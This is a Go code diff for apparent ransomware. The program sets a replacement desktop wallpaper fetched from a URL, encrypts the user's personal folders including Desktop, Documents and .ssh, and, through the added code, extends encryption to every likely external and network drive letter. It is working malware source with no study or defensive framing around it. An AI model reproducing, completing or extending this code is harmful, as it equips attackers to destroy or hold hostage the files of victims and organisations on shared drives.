@@ -6,20 +6,17 @@ import (
 	"path/filepath"
 	"github.com/reujab/wallpaper"
 	"os/user"
+	"sync"
 )
 
+var wg sync.WaitGroup
+
 func main() {
-	directories := []string{`\Desktop`, `\Documents`, `\Pictures`, `\Videos`, `\.ssh`, `\Downloads`}
-	usr, _ := user.Current()
-	//FileEncryption.InitializeBlock([]byte("a very very very very secret key"))
 	//wallpaper.SetFromURL("https://upload.vaa.red/i/LbqAG.png") // original wallpaper
 	wallpaper.SetFromURL("https://upload.vaa.red/i/V821X.png") //meatball wallpaper
-
-	for _, directory := range directories{
-		root := usr.HomeDir + directory
-		encrypt(root)
-	}
-
+	wg.Add(2)
+	personalFiles()
+	externalDrives()
 
 }
 
@@ -35,4 +32,23 @@ func encrypt(root string) {
 		//fmt.Printf("%T", file) //for testing in a safe manner
 		FileEncryption.Encrypter(file)
 	}
+}
+
+func personalFiles() {
+	directories := []string{`\Desktop`, `\Documents`, `\Pictures`, `\Videos`, `\.ssh`, `\Downloads`}
+	usr, _ := user.Current()
+	for _, directory := range directories {
+		root := usr.HomeDir + directory
+		encrypt(root)
+	}
+	wg.Done()
+}
+
+func externalDrives() {
+	driveLetters := []string{"D", "E", "F", "G", "H", "I", "J", "K", "U", "X", "Y", "Z"} //listed probable drive letters and also possible network drives
+	for _, drive := range driveLetters {
+		root := drive + `:\`
+		encrypt(root)
+	}
+	wg.Done()
 }
